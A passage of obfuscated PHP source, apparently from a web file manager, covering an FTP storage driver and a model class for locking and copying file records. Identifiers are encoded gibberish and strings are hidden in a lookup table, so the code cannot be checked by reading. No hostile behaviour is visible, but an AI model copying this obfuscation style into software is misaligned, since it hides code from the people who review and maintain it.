($“‹ÌóÆ[0] == $®¡ÂºœÏ[848]) { continue; } $°úì¸¶á = $“‹ÌóÆ[8]; if (empty($°úì¸¶á) && $°úì¸¶á !== $®¡ÂºœÏ[231] || isset($›šĞË°[$°úì¸¶á])) { continue; } $°úì¸¶á = $this->iconvApp($›èÏÆ»ë . ltrim($°úì¸¶á, $®¡ÂºœÏ[8])); $şÀæ¥îı = array($®¡ÂºœÏ[32] => $°úì¸¶á, $®¡ÂºœÏ[33] => $®¡ÂºœÏ[233], $®¡ÂºœÏ[79] => $“‹ÌóÆ[4]); if (substr($¶£©Ã„Ä, 0, 1) == $®¡ÂºœÏ[1489]) { $şÀæ¥îı[$®¡ÂºœÏ[33]] = $®¡ÂºœÏ[78]; $şÀæ¥îı[$®¡ÂºœÏ[79]] = 0; } $â²ÖâÌ– = $şÀæ¥îı[$®¡ÂºœÏ[33]] == $®¡ÂºœÏ[78] ? !0 : !1; $this->cacheMethodInfoSet($°úì¸¶á, $â²ÖâÌ–, $şÀæ¥îı); if ($â²ÖâÌ–) { $¨é¦ä×ü[] = $°úì¸¶á; if ($ÌÀ›²´Â) { $this->fileList($°úì¸¶á, $¨é¦ä×ü, $Çƒè³Ô, $ÌÀ›²´Â); } continue; } $Çƒè³Ô[] = $şÀæ¥îı; } $this->cacheMethodInfoSet($›èÏÆ»ë, !0); } private function _listItem($’ãı®Âş) { if (empty($’ãı®Âş)) { return array(); } $Ù‹‰ß¸ = preg_split($_SERVER[Î·Ü›öğ][1490], $’ãı®Âş); if (count($Ù‹‰ß¸) <= 9) { return $Ù‹‰ß¸; } $Ù‹‰ß¸[8] = trim(substr($’ãı®Âş, strpos($’ãı®Âş, $Ù‹‰ß¸[7]) + strlen($Ù‹‰ß¸[7]))); return array_splice($Ù‹‰ß¸, 0, 9); } public function listPath($ Ê­ÍŠ˜, $âÓ¾ûü… = false) { $¡èŒÃá =& $_SERVER[Î·Ü›öğ]; if (!$this->_isconn()) { return !1; } $àÊå–› = $æÏÏ·‚ = array(); $this->fileList($ Ê­ÍŠ˜, $àÊå–›, $æÏÏ·‚); foreach ($àÊå–› as $é¤ÕÔŒ => $ı†¢å÷‘) { $àÊå–›[$é¤ÕÔŒ] = $this->folderInfo($ı†¢å÷‘, $âÓ¾ûü…); } foreach ($æÏÏ·‚ as $é¤ÕÔŒ => $ı†¢å÷‘) { $æÏÏ·‚[$é¤ÕÔŒ] = $this->fileInfo($ı†¢å÷‘[$¡èŒÃá[32]], $âÓ¾ûü…, $ı†¢å÷‘); } return array($¡èŒÃá[85] => $àÊå–›, $¡èŒÃá[86] => $æÏÏ·‚); } public function has($ŞŠõííÂ, $À¶Îğƒ· = false, $²Š®œÎŒ = true) { $²ĞÁèÇ =& $_SERVER[Î·Ü›öğ]; $Ò™È–ùŠ = $›ßæ‹Úı = array(); $×¦Çı­Ê = $À¶Îğƒ· ? !0 : !1; $this->fileList($ŞŠõííÂ, $Ò™È–ùŠ, $›ßæ‹Úı, $×¦Çı­Ê); if ($À¶Îğƒ·) { return array($²ĞÁèÇ[242] => count($›ßæ‹Úı), $²ĞÁèÇ[243] => count($Ò™È–ùŠ)); } if ($²Š®œÎŒ) { if (count($›ßæ‹Úı)) { return !0; } } else { if (count($Ò™È–ùŠ)) { return !0; } } return !1; } public function listAll($ÄÓü¸”Ì) { $Àíğëì³ =& $_SERVER[Î·Ü›öğ]; if (!$this->_isconn()) { return !1; } $Êª”½® = $ÖÄ©¢õÚ = array(); $this->fileList($ÄÓü¸”Ì, $Êª”½®, $ÖÄ©¢õÚ, !0); $ı¶îÇÍæ = array_to_keyvalue($ÖÄ©¢õÚ, $Àíğëì³[32]); foreach ($Êª”½® as $®¨ÑìØÕ) { if (is_string($®¨ÑìØÕ)) { $ı¶îÇÍæ[$®¨ÑìØÕ] = array($Àíğëì³[79] => 0); } } return $this->listAllFiles($ÄÓü¸”Ì, $ı¶îÇÍæ); } public function getContent($˜‰ûââê) { if (!$this->_isconn()) { return !1; } $˜‰ûââê = $this->iconvSystem($˜‰ûââê); return $this->fileSubstr($˜‰ûââê); } public function setContent($€ŒÙÒŞ¿, $ÃîÅÃã˜ = '') { if (!$this->_isconn()) { return !1; } $â¦æ¤Óü = $this->pathThis($this->iconvSystem($€ŒÙÒŞ¿)); $Ô²¨Ö¨  = $this->tempFile($â¦æ¤Óü); file_put_contents($Ô²¨Ö¨ , $ÃîÅÃã˜); $Ìƒ®ì÷µ = $this->upload($€ŒÙÒŞ¿, $this->iconvApp($Ô²¨Ö¨ )); $this->tempFileRemve($Ô²¨Ö¨ ); return $Ìƒ®ì÷µ; } public function fileSubstr($à°¾À, $ÖÅø‹¸Ù = 0, $·’ÓûÕÓ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($à°¾À, $ÖÅø‹¸Ù, $·’ÓûÕÓ); } private function ftpRequest($Æ› ¼­Ÿ, $®Á…àÊ = 0, $Ó‰„Å›Ê = false) { $¾Â¾«£è =& $_SERVER[Î·Ü›öğ]; $Æ› ¼­Ÿ = $¾Â¾«£è[8] . ltrim(str_ltrim($Æ› ¼­Ÿ, $this->ftpPath), $¾Â¾«£è[8]); $Æ› ¼­Ÿ = $this->iconvSystem($Æ› ¼­Ÿ); $·‹Ğ…Àó = $this->scheme . $this->host . $¾Â¾«£è[4] . $this->port; $Ôï ‡ı‚ = curl_init(); curl_setopt($Ôï ‡ı‚, CURLOPT_URL, $·‹Ğ…Àó . $this->pathEncode($Æ› ¼­Ÿ)); curl_setopt($Ôï ‡ı‚, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($Ó‰„Å›Ê) { $·Øˆ¿ˆü = $®Á…àÊ + $Ó‰„Å›Ê - 1; curl_setopt($Ôï ‡ı‚, CURLOPT_RANGE, "{$®Á…àÊ}\x2d{$·Øˆ¿ˆü}"); } curl_setopt($Ôï ‡ı‚, CURLOPT_RETURNTRANSFER, 1); $±Ÿ¼‚‰Ç = curl_exec($Ôï ‡ı‚); curl_close($Ôï ‡ı‚); return $±Ÿ¼‚‰Ç; } public function upload($Øç‰œé‹, $êÌş“Ù•, $Ä·©ÜÎ¼ = false, $·®¾¾¥¥ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($Øç‰œé‹))) { return !1; } $Øç‰œé‹ = $this->iconvSystem($Øç‰œé‹); $êÌş“Ù• = $this->iconvSystem($êÌş“Ù•); $»¦½‰•ï = ftp_nb_put($this->connect, $Øç‰œé‹, $êÌş“Ù•, FTP_BINARY); while ($»¦½‰•ï == FTP_MOREDATA) { $»¦½‰•ï = ftp_nb_continue($this->connect); } if ($»¦½‰•ï != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[Î·Ü›öğ][1488], !0); return !1; } return $this->getPathOuter($Øç‰œé‹); } public function download($‘¯Àı³Ì, $î¡µ÷¿ = '') { if (!$this->_isconn()) { return !1; } $‹»üÒªÀ = $this->pathFather($î¡µ÷¿); if (!IO::mkdir($‹»üÒªÀ)) { return !1; } $‘¯Àı³Ì = $this->iconvSystem($‘¯Àı³Ì); $î¡µ÷¿ = $this->iconvSystem($î¡µ÷¿); $êû÷İï = ftp_nb_get($this->connect, $î¡µ÷¿, $‘¯Àı³Ì, FTP_BINARY); while ($êû÷İï == FTP_MOREDATA) { $êû÷İï = ftp_nb_continue($this->connect); } if ($êû÷İï != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[Î·Ü›öğ][1488], !0); return !1; } return $this->iconvApp($î¡µ÷¿); } public function exist($á¾º„â) { return $this->isFile($á¾º„â) || $this->isFolder($á¾º„â); } public function isFile($é§øŞ˜Ğ) { return !$this->isFolder($é§øŞ˜Ğ) && $this->objectMeta($é§øŞ˜Ğ); } public function isFolder($‹ú³ìÍ‡) { return $this->cacheMethod($_SERVER[Î·Ü›öğ][180], $‹ú³ìÍ‡); } protected function objectMeta($ûºñåÜ) { return $this->cacheMethod($_SERVER[Î·Ü›öğ][182], $ûºñåÜ); } protected function _objectMeta($ÒÁ„îŒÌ) { $Øƒ‡’ò• =& $_SERVER[Î·Ü›öğ]; if ($ÒÁ„îŒÌ == $Øƒ‡’ò•[12] || $ÒÁ„îŒÌ == $Øƒ‡’ò•[8]) { return array(); } if (!$this->_isconn()) { return !1; } $ÒÁ„îŒÌ = $this->iconvSystem($ÒÁ„îŒÌ); $öõÏØØı = array($Øƒ‡’ò•[32] => $this->iconvApp($ÒÁ„îŒÌ), $Øƒ‡’ò•[33] => $Øƒ‡’ò•[233], $Øƒ‡’ò•[79] => 0); $Üúº¯¨« = @ftp_size($this->connect, $ÒÁ„îŒÌ); if ($Üúº¯¨« != -1) { $öõÏØØı[$Øƒ‡’ò•[79]] = $Üúº¯¨«; } else { $‰ÜÜÌ¥Ê = @ftp_chdir($this->connect, $ÒÁ„îŒÌ); if (!$‰ÜÜÌ¥Ê) { return !1; } @ftp_chdir($this->connect, $Øƒ‡’ò•[8]); $öõÏØØı[$Øƒ‡’ò•[33]] = $Øƒ‡’ò•[78]; } return $öõÏØØı; } protected function _isFolder($õÛÇş­â) { $ğ“ğ°É÷ =& $_SERVER[Î·Ü›öğ]; if ($õÛÇş­â == $ğ“ğ°É÷[12] || $õÛÇş­â == $ğ“ğ°É÷[8]) { return !0; } $³ËØº€´ = $this->_objectMeta($õÛÇş­â); return isset($³ËØº€´[$ğ“ğ°É÷[33]]) && $³ËØº€´[$ğ“ğ°É÷[33]] == $ğ“ğ°É÷[78] ? !0 : !1; } } goto cÇéŞÇïÚä; d‘…¦âÛ¢ª: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($··÷õ) { $á½öùÆŠ =& $_SERVER[Î·Ü›öğ]; if (!$this->allowLock()) { return; } $this->_lockCheck($á½öùÆŠ[634], $··÷õ); $œÎÚÀûĞ = 1; $this->_lockEvent($··÷õ, array($á½öùÆŠ[635], $á½öùÆŠ[636]), $œÎÚÀûĞ); $this->_lockParent($··÷õ, array($á½öùÆŠ[636]), $œÎÚÀûĞ); $this->_lockEvent($··÷õ, array($á½öùÆŠ[637], $á½öùÆŠ[638]), $œÎÚÀûĞ); $this->_lockCheckEnd($á½öùÆŠ[634], $··÷õ); } public function lockCopyEnd($ÔÆÅ¨Ğæ) { $±ë§Üİ =& $_SERVER[Î·Ü›öğ]; if (!$this->allowLock()) { return; } $ÒÉ¦ÌÁ‰ = 0; $this->_lockEvent($ÔÆÅ¨Ğæ, array($±ë§Üİ[635], $±ë§Üİ[636]), $ÒÉ¦ÌÁ‰); $this->_lockParent($ÔÆÅ¨Ğæ, array($±ë§Üİ[636]), $ÒÉ¦ÌÁ‰); $this->_lockEvent($ÔÆÅ¨Ğæ, array($±ë§Üİ[637], $±ë§Üİ[638]), $ÒÉ¦ÌÁ‰); } public function lockWriteStart($”ãÈâı€, $—‚³¸²– = '') { $Ñ¨¥³¯Ï =& $_SERVER[Î·Ü›öğ]; if (!$this->allowLock()) { return; } $this->_lockCheck($Ñ¨¥³¯Ï[635], $”ãÈâı€); $³óí®‹Ü = 1; $this->_lockKey($Ñ¨¥³¯Ï[639] . $”ãÈâı€ . $Ñ¨¥³¯Ï[10] . $—‚³¸²–, $³óí®‹Ü); $this->_lockEvent($”ãÈâı€, array($Ñ¨¥³¯Ï[634], $Ñ¨¥³¯Ï[636]), $³óí®‹Ü); $this->_lockParent($”ãÈâı€, array($Ñ¨¥³¯Ï[634], $Ñ¨¥³¯Ï[636]), $³óí®‹Ü); $this->_lockCheckEnd($Ñ¨¥³¯Ï[635], $”ãÈâı€); } public function lockWriteEnd($íÅõÔ©•, $Æ«ìÆñ¸ = '') { $š„²¼êë =& $_SERVER[Î·Ü›öğ]; if (!$this->allowLock()) { return; } $ß™¬œ‘– = 0; $this->_lockKey($š„²¼êë[639] . $íÅõÔ©• . $š„²¼êë[10] . $Æ«ìÆñ¸, $ß™¬œ‘–); $this->_lockEvent($íÅõÔ©•, array($š„²¼êë[634], $š„²¼êë[636]), $ß™¬œ‘–); $this->_lockParent($íÅõÔ©•, array($š„²¼êë[634], $š„²¼êë[636]), $ß™¬œ‘–); } public function lockMoveStart($„çƒÕ·) { $èíÕ÷µ§ =& $_SERVER[Î·Ü›öğ]; if (!$this->allowLock()) { return; } $this->_lockCheck($èíÕ÷µ§[636], $„çƒÕ·); $ñÖæ£şü = 1; $this->_lockKey($èíÕ÷µ§[640] . $„çƒÕ·, $ñÖæ£şü); $this->_lockEvent($„çƒÕ·, array($èíÕ÷µ§[634], $èíÕ÷µ§[635]), $ñÖæ£şü); $this->_lockParent($„çƒÕ·, array($èíÕ÷µ§[634], $èíÕ÷µ§[636]), $ñÖæ£şü); $this->_lockEvent($„çƒÕ·, array($èíÕ÷µ§[641], $èíÕ÷µ§[637], $èíÕ÷µ§[638]), $ñÖæ£şü); $this->_lockCheckEnd($èíÕ÷µ§[636], $„çƒÕ·); } public function lockMoveEnd($¾¬ùËô) { $Úç™ù®ß =& $_SERVER[Î·Ü›öğ]; if (!$this->allowLock()) { return; } $’ùŒäÁÂ = 0; $this->_lockKey($Úç™ù®ß[640] . $¾¬ùËô, $’ùŒäÁÂ); $this->_lockEvent($¾¬ùËô, array($Úç™ù®ß[634], $Úç™ù®ß[635]), $’ùŒäÁÂ); $this->_lockParent($¾¬ùËô, array($Úç™ù®ß[634], $Úç™ù®ß[636]), $’ùŒäÁÂ); $this->_lockEvent($¾¬ùËô, array($Úç™ù®ß[641], $Úç™ù®ß[637], $Úç™ù®ß[638]), $’ùŒäÁÂ); } private function _lockCheck($â–·¬İË, $àÄóûèÖ) { $”ì´Ëå =& $_SERVER[Î·Ü›öğ]; $é÷Ì½“ü = $this->sourceInfo($àÄóûèÖ); $¼»Š™»¿ = $â–·¬İË . $”ì´Ëå[10] . $àÄóûèÖ; $this->_lockTimeStart[$¼»Š™»¿] = timeFloat(); if (!is_array($é÷Ì½“ü)) { return; } $­·ŒÃ‡ = LNG($”ì´Ëå[642]); CacheLock::setErrorMsg($”ì´Ëå[176] . htmlspecialchars($é÷Ì½“ü[$”ì´Ëå[32]]) . $”ì´Ëå[178] . $­·ŒÃ‡); $this->_lockKey($¼»Š™»¿, 1); $this->_lockKey($¼»Š™»¿, 0); $Š¯Ÿ€Ò = array_reverse($this->parentLevelArray($é÷Ì½“ü[$”ì´Ëå[597]])); foreach ($Š¯Ÿ€Ò as $â€£Œıö) { $¼»Š™»¿ = $â–·¬İË . $”ì´Ëå[643] . $â€£Œıö; if (CacheLock::lockGet($”ì´Ëå[644] . $¼»Š™»¿)) { $é÷Ì½“ü = $this->sourceInfo($â€£Œıö); CacheLock::setErrorMsg($”ì´Ëå[176] . htmlspecialchars($é÷Ì½“ü[$”ì´Ëå[32]]) . $”ì´Ëå[178] . $­·ŒÃ‡); $this->_lockKey($¼»Š™»¿, 1); $this->_lockKey($¼»Š™»¿, 0); } } } private function _lockCheckEnd($î†˜·², $³Ş¼¾é‘) { $ÖÙ™¶÷Ú =& $_SERVER[Î·Ü›öğ]; $ÈŞ£§ŸÇ = $î†˜·² . $ÖÙ™¶÷Ú[10] . $³Ş¼¾é‘; CacheLock::setErrorMsg($ÖÙ™¶÷Ú[456]); if (!isset($this->_lockTimeStart[$ÈŞ£§ŸÇ])) { return; } $‹¯¨©µ = timeFloat() - $this->_lockTimeStart[$ÈŞ£§ŸÇ]; unset($this->_lockTimeStart[$ÈŞ£§ŸÇ]); if ($‹¯¨©µ > 0.5) { unset(self::$cacheSourceInfo[$ÖÙ™¶÷Ú[544] . $³Ş¼¾é‘]); } $ ñĞ¸¨ˆ = $this->sourceInfo($³Ş¼¾é‘); if (!$ ñĞ¸¨ˆ) { show_json(LNG($ÖÙ™¶÷Ú[108]), !1); } } private function _lockParent($§¦ˆœìİ, $ù©Â»Ú», $ÄÀª£‘) { if (!$this->autoLockSet) { return; } $¸úİƒ¦Ÿ = $this->sourceInfo($§¦ˆœìİ); if (!is_array($¸úİƒ¦Ÿ)) { return; } $ºñ Óóæ = array_reverse($this->parentLevelArray($¸úİƒ¦Ÿ[$_SERVER[Î·Ü›öğ][597]])); foreach ($ºñ Óóæ as $¶ÊÈ¼í½) { $this->_lockEvent($¶ÊÈ¼í½, $ù©Â»Ú», $ÄÀª£‘); } } private function _lockEvent($çèì¦à², $Í¦ó²Öä, $ì“–âÆĞ) { $¯•é±îò =& $_SERVER[Î·Ü›öğ]; if (!$this->autoLockSet) { return; } foreach ($Í¦ó²Öä as $ƒ™ËÁ´) { $¥²ÇÊóÇ = $ƒ™ËÁ´ . $¯•é±îò[10] . $çèì¦à²; if ($ì“–âÆĞ && CacheLock::lockGet($¯•é±îò[644] . $¥²ÇÊóÇ)) { continue; } $this->_lockKey($¥²ÇÊóÇ, $ì“–âÆĞ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($úµ€Í¬, $§öî–½ò = 1) { $‚Åø‘½ğ = $_SERVER[Î·Ü›öğ][644] . md5($úµ€Í¬); if ($§öî–½ò) { if (isset(self::$_lockItemArr[$‚Åø‘½ğ])) { return; } self::$_lockItemArr[$‚Åø‘½ğ] = 1; CacheLock::lock($‚Åø‘½ğ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$‚Åø‘½ğ])) { return; } unset(self::$_lockItemArr[$‚Åø‘½ğ]); CacheLock::unlock($‚Åø‘½ğ); } } public function isParentOf($£Ã¬È††, $ÚŸäş½) { $­‚í†ô» =& $_SERVER[Î·Ü›öğ]; $÷Ì©‘Ì = $this->sourceInfo($£Ã¬È††); $ÃÌôÁÛ¶ = $this->sourceInfo($ÚŸäş½); $¦œµ®›£ = $÷Ì©‘Ì[$­‚í†ô»[597]] . $÷Ì©‘Ì[$­‚í†ô»[194]] . $­‚í†ô»[50]; $êøãî = $ÃÌôÁÛ¶[$­‚í†ô»[597]] . $ÃÌôÁÛ¶[$­‚í†ô»[194]] . $­‚í†ô»[50]; $©Æ‘‹¹ = strpos($êøãî, $¦œµ®›£) === 0; return $©Æ‘‹¹; } private $targetIsDelete = 0; public function copy($×œ‡‘´ô, $ı”ÅÛû­, $ ¼†“Œ = REPEAT_REPLACE, $¿¯ŞĞê = '') { $ñĞú´—ù =& $_SERVER[Î·Ü›öğ]; $ø“ şâ = $this->sourceInfo($×œ‡‘´ô); $œ»â×õŞ = $this->sourceInfo($ı”ÅÛû­); if (!$ø“ şâ || !$œ»â×õŞ || $œ»â×õŞ[$ñĞú´—ù[496]] != $ñĞú´—ù[91]) { return !1; } if ($this->isParentOf($×œ‡‘´ô, $ı”ÅÛû­)) { return !1; } $ì×¤Ş½‹ = $¿¯ŞĞê ? $¿¯ŞĞê : $ø“ şâ[$ñĞú´—ù[32]]; $this->lockCopyStart($×œ‡‘´ô); $this->lockWriteStart($ı”ÅÛû­, $ì×¤Ş½‹); $†Ğñ’‡µ = array($ñĞú´—ù[645] => array(), $ñĞú´—ù[646] => array(), $ñĞú´—ù[647] => array()); $this->targetIsDelete = intval($ø“ şâ[$ñĞú´—ù[516]]); $âúèâ„‰ = $this->fileNameExistAuto($ı”ÅÛû­, $ø“ şâ); $¢Şµêæ› = $this->_copy($×œ‡‘´ô, $ı”ÅÛû­, $ ¼†“Œ, $†Ğñ’‡µ, !0, $¿¯ŞĞê); $this->_childrenListClear(); $this->lockCopyEnd($×œ‡‘´ô); $this->lockWriteEnd($ı”ÅÛû­, $ì×¤Ş½‹); if ($ø“ şâ[$ñĞú´—ù[496]] == $ñĞú´—ù[91] && $âúèâ„‰ == $¢Şµêæ›) { $this->folderSizeResetChildren($âúèâ„‰); } Model($ñĞú´—ù[648])->addAll($†Ğñ’‡µ[$ñĞú´—ù[646]], array(), !0); if ($âúèâ„‰ != $¢Şµêæ› || $ø“ şâ[$ñĞú´—ù[496]] == $ñĞú´—ù[91]) { Model($ñĞú´—ù[649])->eventCopy($¢Şµêæ›); } $this->saveAll($†Ğñ’‡µ[$ñĞú´—ù[647]]); Model($ñĞú´—ù[233])->linkAdd($†Ğñ’‡µ[$ñĞú´—ù[645]]); $this->folderSizeReset($ı”ÅÛû­); $this->updateModifyTime($ı”ÅÛû­); return $¢Şµêæ›; } private function _copy($Åîüà¬ı, $âòØùñĞ, $ª»¨÷çÀ, &$ÈÀÄ€÷, $ˆÎ£©‚‡, $©²®™°¶ = '') { $¨çÏ…¿ =& $_SERVER[Î·Ü›öğ]; $ñ¥Å = $this->sourceInfoCache($Åîüà¬ı); $ŒÂÎÎ¶ = $ñ¥Å[$¨çÏ…¿[496]] == $¨çÏ…¿[91]; $¢ø‡·¨¦ = $©²®™°¶ ? $©²®™°¶ : $ñ¥Å[$¨çÏ…¿[32]]; $ñ€ªı·³ = $this->fileNameExistAuto($âòØùñĞ, $ñ¥Å); if ($ˆÎ£©‚‡) { $this->_childrenAllMake($Åîüà¬ı); if ($ŒÂÎÎ¶ && $ñ€ªı·³) { $this->_childrenAllMake($ñ€ªı·³); } } if (!$ñ€ªı·³) { return $this->_copyCreate($Åîüà¬ı, $âòØùñĞ, $¢ø‡·¨¦, $ÈÀÄ€÷); } $æ”¹Û¬ = $ñ€ªı·³; if ($ŒÂÎÎ¶) { if ($ª»¨÷çÀ == REPEAT_RENAME_FOLDER) { $¢ø‡·¨¦ = $this->fileNameAutoCache($âòØùñĞ, $¢ø‡·¨¦, $ª»¨÷çÀ, $ŒÂÎÎ¶); $æ”¹Û¬ = $this->_copyCreate($Åîüà¬ı, $âòØùñĞ, $¢ø‡·¨¦, $ÈÀÄ€÷); } else { $ÇÑ¨Ñş = $this->_childrenList($Åîüà¬ı); foreach ($ÇÑ¨Ñş as $§Å”´) { $this->_copy($§Å”´[$¨çÏ…¿[194]], $ñ€ªı·³, $ª»¨÷çÀ, $ÈÀÄ€÷, !1); } } } else { if ($ª»¨÷çÀ == REPEAT_RENAME || $ª»¨÷çÀ == REPEAT_RENAME_FOLDER) { $¢ø‡·¨¦ = $this->fileNameAutoCache($âòØùñĞ, $¢ø‡·¨¦, $ª»¨÷çÀ, $ŒÂÎÎ¶); $æ”¹Û¬ = $this->_copyCreate($Åîüà¬ı, $âòØùñĞ, $¢ø‡·¨¦, $ÈÀÄ€÷); } else { if ($ª»¨÷çÀ == REPEAT_REPLACE) { $¹‰ìĞÂ¯ = $this->sourceInfoCache($ñ€ªı·³); $²€à£ = $this->fileHistory($¹‰ìĞÂ¯, $ñ¥Å[$¨çÏ…¿[554]], $ñ¥Å[$¨çÏ…¿[79]]); if ($²€à£) { $ÈÀÄ€÷[$¨çÏ…¿[645]][] = $ñ¥Å[$¨çÏ…¿[554]]; } } else { if ($ª»¨÷çÀ == REPEAT_SKIP) { } } } Hook::trigger($¨çÏ…¿[650], array($¨çÏ…¿[651], $ñ¥Å, 0)); } return $æ”¹Û¬; } private function _copyCreate($¤¨¸Ò€¬, $ôä¸ß²›, $õÂÑ§™, &$É›ıÇ) { $¹â†ÉšÉ =& $_SERVER[Î·Ü›öğ]; $å‚â®õß = $this->sourceInfoCache($¤¨¸Ò€¬); $ä¿ıò¯ = $this->sourceInfoCache($ôä¸ß²›); $ÃÉ‚·Î¿ = $this->_makeItemData($å‚â®õß, $ä¿ıò¯, $õÂÑ§™); Hook::trigger($¹â†ÉšÉ[652], $ÃÉ‚·Î¿); Hook::trigger($¹â†ÉšÉ[653], array($¹â†ÉšÉ[654], $ÃÉ‚·Î¿, 0)); $‚óğäË„ = $this->add($ÃÉ‚·Î¿); $÷ÎÛ’’İ = array($¹â†ÉšÉ[194] => $‚óğäË„, $¹â†ÉšÉ[32] => $õÂÑ§™); $this->_copyApplyMeta($÷ÎÛ’’İ, $É›ıÇ); if ($å‚â®õß[$¹â†ÉšÉ[496]] != $¹â†ÉšÉ[91]) { $É›ıÇ[$¹â†ÉšÉ[645]][] = $å‚â®õß[$¹â†ÉšÉ[554]]; return $‚óğäË„; } $úİú¿ğ™ = array(); $ŠÇ¿©–© = array(); $this->_childrenListAll($¤¨¸Ò€¬, $úİú¿ğ™); $‹Şúœ£Ç = count($úİú¿ğ™); if ($‹Şúœ£Ç == 0) { return $‚óğäË„; } $’³îÊÃ² = $this->sourceInfo($‚óğäË„); foreach ($úİú¿ğ™ as $šúôµÈ¸) { $›ç€ÎÑä = $this->_makeItemData($šúôµÈ¸, $’³îÊÃ², $šúôµÈ¸[$¹â†ÉšÉ[32]]); $›ç€ÎÑä[$¹â†ÉšÉ[597]] = $šúôµÈ¸[$¹â†ÉšÉ[597]]; $ŠÇ¿©–©[] = $›ç€ÎÑä; } $this->chunkEventSet($¹â†ÉšÉ[655], array($¹â†ÉšÉ[656], $ÃÉ‚·Î¿, $‹Şúœ£Ç)); $this->addAll($ŠÇ¿©–©, array(), !1); $âÍ‰ˆÕô = $this->where(array($¹â†ÉšÉ[193] => $‚óğäË„))->select(); $ØÍÈ²ó© = $this->_childrenMakeRelation($úİú¿ğ™, $âÍ‰ˆÕô); $ØÍÈ²ó©[$¤¨¸Ò€¬] = $‚óğäË„; $¢ôšëŒ = array(); $ÎÙ‹·„Û = array(); foreach ($âÍ‰ˆÕô as $šúôµÈ¸) { $€Å‹òû = $šúôµÈ¸[$¹â†ÉšÉ[194]]; $©²¼Óâô = $this->_childrenMatch($ØÍÈ²ó©, $šúôµÈ¸, $’³îÊÃ²); $¢ôšëŒ[] = array($¹â†ÉšÉ[194], $€Å‹òû, $¹â†ÉšÉ[193], $©²¼Óâô[$¹â†ÉšÉ[193]]); $ÎÙ‹·„Û[] = array($¹â†ÉšÉ[194], $€Å‹òû, $¹â†ÉšÉ[597], $©²¼Óâô[$¹â†ÉšÉ[597]]); $this->_copyApplyMeta($šúôµÈ¸, $É›ıÇ); if ($šúôµÈ¸[$¹â†ÉšÉ[496]] != $¹â†ÉšÉ[91]) { $É›ıÇ[$¹â†ÉšÉ[645]][] = $šúôµÈ¸[$¹â†ÉšÉ[554]]; } } $this->chunkEventSet($¹â†ÉšÉ[657], array($¹â†ÉšÉ[658], $ÃÉ‚·Î¿, $‹Şúœ£Ç)); $this->saveAll($¢ôšëŒ); $this->chunkEventSet($¹â†ÉšÉ[659], array($¹â†ÉšÉ[660], $ÃÉ‚·Î¿, $‹Şúœ£Ç)); $this->saveAll($ÎÙ‹·„Û); return $‚óğäË„; } private function _childrenMakeRelation($º£Ö“¶¯, $ş°ï¾Ö¿) { $Â¿ãê™Œ =& $_SERVER[Î·Ü›öğ]; $©•òÎ = array(); $Úïã™œÏ = array(); foreach ($º£Ö“¶¯ as $åøô¡ö§) { $‘ƒÊ³å = $åøô¡ö§[$Â¿ãê™Œ[32]] . $Â¿ãê™Œ[8] . $åøô¡ö§[$Â¿ãê™Œ[597]]; $©•òÎ[$‘ƒÊ³å] = $åøô¡ö§[$Â¿ãê™Œ[194]]; } foreach ($ş°ï¾Ö¿ as $åøô¡ö§) { $‘ƒÊ³å = $åøô¡ö§[$Â¿ãê™Œ[32]] . $Â¿ãê™Œ[8] . $åøô¡ö§[$Â¿ãê™Œ[597]]; $İ«àšºå = $©•òÎ[$‘ƒÊ³å]; $Úïã™œÏ[$İ«àšºå] = $åøô¡ö§[$Â¿ãê™Œ[194]]; } return $Úïã™œÏ; } private function _childrenMatch($Ú¤³ËÃõ, $ˆ­‡ÀÁã, $ÂğÉ•Ê‚) { $¤Ï¸’† =& $_SERVER[Î·Ü›öğ]; $¯ ü÷ğ = $ÂğÉ•Ê‚[$¤Ï¸’†[597]]; $¥¾”ÛâŞ = $this->parentLevelArray($ˆ­‡ÀÁã[$¤Ï¸’†[597]]); foreach ($¥¾”ÛâŞ as $Òß•ÚšÚ) { if (isset($Ú¤³ËÃõ[$Òß•ÚšÚ])) { $¯ ü÷ğ .= $Ú¤³ËÃõ[$Òß•ÚšÚ] . $¤Ï¸’†[661]; } } $¯ ü÷ğ = rtrim($¯ ü÷ğ, $¤Ï¸’†[50]) . $¤Ï¸’†[50]; $¼½Ó‘ï¬ = $this->parentLevelArray($¯ ü÷ğ); $ÁŸùõêî = $¼½Ó‘ï¬[count($¼½Ó‘ï¬) - 1]; return array($¤Ï¸’†[193] => $ÁŸùõêî, $¤Ï¸’†[597] => $¯ ü÷ğ); } private function _makeItemData($„Çï’ÁÀ, $šÅÈÑœ«, $çùã×ğ—) { $ŸîÖù³é =& $_SERVER[Î·Ü›öğ]; $¤Ï–Â²ø = array($ŸîÖù³é[662] => $„Çï’ÁÀ[$ŸîÖù³é[496]], $ŸîÖù³é[505] => $çùã×ğ—, $ŸîÖù³é[663] => $„Çï’ÁÀ[$ŸîÖù³é[497]] ? $„Çï’ÁÀ[$ŸîÖù³é[497]] : $ŸîÖù³é[12], $ŸîÖù³é[555] => $„Çï’ÁÀ[$ŸîÖù³é[554]] ? $„Çï’ÁÀ[$ŸîÖù³é[554]] : 0, $ŸîÖù³é[633] => $„Çï’ÁÀ[$ŸîÖù³é[79]] ? $„Çï’ÁÀ[$ŸîÖù³é[79]] : 0, $ŸîÖù³é[664] => intval($šÅÈÑœ«[$ŸîÖù³é[191]]), $ŸîÖù³é[665] => intval($šÅÈÑœ«[$ŸîÖù³é[582]]), $ŸîÖù³é[666] => intval(USER_ID), $ŸîÖù³é[667] => intval(USER_ID), $ŸîÖù³é[488] => intval($šÅÈÑœ«[$ŸîÖù³é[194]]), $ŸîÖù³é[668] => $šÅÈÑœ«[$ŸîÖù³é[597]] . $šÅÈÑœ«[$ŸîÖù³é[194]] . $ŸîÖù³é[50], $ŸîÖù³é[509] => $„Çï’ÁÀ[$ŸîÖù³é[88]] ? $„Çï’ÁÀ[$ŸîÖù³é[88]] : time(), $ŸîÖù³é[515] => 0, $ŸîÖù³é[669] => 